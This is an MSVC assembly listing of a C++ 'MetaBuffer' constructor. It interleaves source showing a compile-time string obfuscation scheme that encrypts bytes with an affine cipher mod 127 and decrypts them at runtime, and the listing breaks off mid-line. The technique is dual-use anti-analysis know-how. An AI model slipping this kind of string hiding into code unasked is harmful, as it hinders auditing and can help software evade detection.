??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned 